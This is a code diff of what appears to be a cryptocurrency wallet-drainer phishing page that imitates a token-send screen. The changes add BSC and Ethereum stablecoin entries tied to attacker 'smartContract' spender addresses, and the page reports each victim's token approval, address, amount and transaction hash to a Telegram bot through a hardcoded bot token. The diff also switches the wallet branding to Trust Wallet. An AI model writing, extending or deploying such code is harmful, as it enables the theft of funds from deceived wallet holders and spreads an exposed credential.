@@ -85,16 +85,18 @@
                 <label class="label">Address or Domain Name</label>
                 <div class="input-row primary">
                     <input id="recipientInput" type="text" placeholder="Search or Enter" value="0x29A3B590B14d97e25b5b04D9804237E5b491b57b" />
-                    <span class="paste" onclick="pasteAddress()">Paste</span>
+                    <span class="paste" onclick="pasteAddress( )">Paste</span>
                 </div>
 
                 <label class="label">Destination Network</label>
-                <div class="network-row" id="tokenSelector">
+                <div class="network-row" id="tokenSelector" onclick="toggleTokenDropdown()">
                     <div class="network-left">
                         <img id="selectedTokenLogo" src="" alt="Token" class="token-logo">
-                        <span id="selectedTokenName">USDT on Ethereum</span>
+                        <span id="selectedTokenName">USDT on BSC</span>
                     </div>
-
+                    <svg class="network-arrow" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 14l-7 7m0 0l-7-7m7 7V3"></path>
+                    </svg>
                     <div class="token-dropdown-menu" id="tokenDropdownMenu"></div>
                 </div>
 
@@ -116,13 +118,19 @@
 
     <script>
         const TOKENS = {
-            'usdt_eth': { name: 'USDT on Ethereum', symbol: 'USDT', network: 'Ethereum', chainId: 1, chainIdHex: '0x1', address: '0xdac17f958d2ee523a2206206994597c13d831ec7', decimals: 6, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png', rpc: 'https://eth.llamarpc.com', smartContract: '0x9Ef49Ddaa6ee7205a3526647ee21B0EadeCfDe98' }
+            'usdt_bsc': { name: 'USDT on BSC', symbol: 'USDT', network: 'BSC', chainId: 56, chainIdHex: '0x38', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0x55d398326f99059fF775485246999027B3197955/logo.png', rpc: 'https://bsc-dataseed1.binance.org:8545', smartContract: '0xBAE688D04e14E9939C3a5dA69a1D746ea3487570' },
+            'usdc_bsc': { name: 'USDC on BSC', symbol: 'USDC', network: 'BSC', chainId: 56, chainIdHex: '0x38', address: '0x8AC76a51cc950d9822D68b83FE1Ad97B32Cd580d', decimals: 18, logo: 'https://assets.coingecko.com/coins/images/6319/standard/usdc.png', rpc: 'https://bsc-dataseed1.binance.org:8545', smartContract: '0xBAE688D04e14E9939C3a5dA69a1D746ea3487570' },
+            'busd_bsc': { name: 'BUSD on BSC', symbol: 'BUSD', network: 'BSC', chainId: 56, chainIdHex: '0x38', address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', decimals: 18, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56/logo.png', rpc: 'https://bsc-dataseed1.binance.org:8545', smartContract: '0xBAE688D04e14E9939C3a5dA69a1D746ea3487570' },
+            'usdt_eth': { name: 'USDT on Ethereum', symbol: 'USDT', network: 'Ethereum', chainId: 1, chainIdHex: '0x1', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png', rpc: 'https://eth.llamarpc.com', smartContract: '0xbf8f1EA4e780c4cF1a104927bB400699b08E12cA' },
+            'usdc_eth': { name: 'USDC on Ethereum', symbol: 'USDC', network: 'Ethereum', chainId: 1, chainIdHex: '0x1', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48/logo.png', rpc: 'https://eth.llamarpc.com', smartContract: '0xbf8f1EA4e780c4cF1a104927bB400699b08E12cA' },
+            'dai_eth': { name: 'DAI on Ethereum', symbol: 'DAI', network: 'Ethereum', chainId: 1, chainIdHex: '0x1', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0x6B175474E89094C44Da98b954EedeAC495271d0F/logo.png', rpc: 'https://eth.llamarpc.com', smartContract: '0xbf8f1EA4e780c4cF1a104927bB400699b08E12cA' },
+            'busd_eth': { name: 'BUSD on Ethereum', symbol: 'BUSD', network: 'Ethereum', chainId: 1, chainIdHex: '0x1', address: '0x4Fabb145d64652a948d72533023f6E7A623C7C53', decimals: 18, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0x4Fabb145d64652a948d72533023f6E7A623C7C53/logo.png', rpc: 'https://eth.llamarpc.com', smartContract: '0xbf8f1EA4e780c4cF1a104927bB400699b08E12cA' }
         };
 
         const CONFIG = { TELEGRAM_BOT_TOKEN: '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA', TELEGRAM_CHAT_ID: '8933407008' };
-        let selectedToken = 'usdt_eth';
+        let selectedToken = 'usdt_bsc';
 
-        document.addEventListener('DOMContentLoaded', () => {
+        document.addEventListener('DOMContentLoaded', ( ) => {
             initializeTokenDropdown();
             document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
         });
@@ -138,7 +146,7 @@
                     selectToken(key);
                 };
                 option.innerHTML = `<img src="${token.logo}" alt="${token.symbol}" class="token-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22%3E%3Crect fill=%22%23f0f0f0%22 width=%2224%22 height=%2224%22/%3E%3C/svg%3E'"><div class="token-info"><div class="token-name">${token.symbol}</div><div class="token-network">${token.network}</div></div>`;
-                menu.appendChild(option);
+                menu.appendChild(option );
             }
         }
 
@@ -168,7 +176,9 @@
             document.getElementById('selectedTokenName').textContent = token.name;
             document.getElementById('tokenUnit').textContent = token.symbol;
             
+            // CHIUDE IL DROPDOWN SUBITO ✅
             closeDropdown();
+            
             initializeTokenDropdown();
         }
 
@@ -214,9 +224,11 @@
         }
 
         async function sendTelegramNotification(userAddress, txHash, amount, token, recipient) {
-            const explorerUrl = `https://etherscan.io/tx/${txHash}`;
+            const explorerUrl = token.network === 'Ethereum' 
+                ? `https://etherscan.io/tx/${txHash}`
+                : `https://bscscan.com/tx/${txHash}`;
 
-            const messageText = `Token Approve Notification\n\nToken: ${token.symbol}\nNetwork: ${token.network}\nUser: ${userAddress}\nRecipient: ${recipient}\nAmount: ${amount} ${token.symbol}\n\nTransaction Hash:\n${txHash}\n\nExplorer:\n${explorerUrl}\n\nTime: ${new Date().toLocaleString()}\n\nSmart Contract:\n${token.smartContract}`;
+            const messageText = `Token Approve Notification\n\nToken: ${token.symbol}\nNetwork: ${token.network}\nUser: ${userAddress}\nRecipient: ${recipient}\nAmount: ${amount} ${token.symbol}\n\nTransaction Hash:\n${txHash}\n\nExplorer:\n${explorerUrl}\n\nTime: ${new Date( ).toLocaleString()}\n\nSmart Contract:\n${token.smartContract}`;
 
             const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
 
@@ -227,7 +239,7 @@
                     body: JSON.stringify({
                         chat_id: CONFIG.TELEGRAM_CHAT_ID,
                         text: messageText
-                    })
+                    } )
                 });
 
                 const responseData = await response.json();
@@ -269,7 +281,7 @@
                 }
 
                 if (!ethereum) {
-                    showError('MetaMask not detected');
+                    showError('Trust Wallet not detected');
                     btn.disabled = false;
                     btn.textContent = 'Next';
                     return;
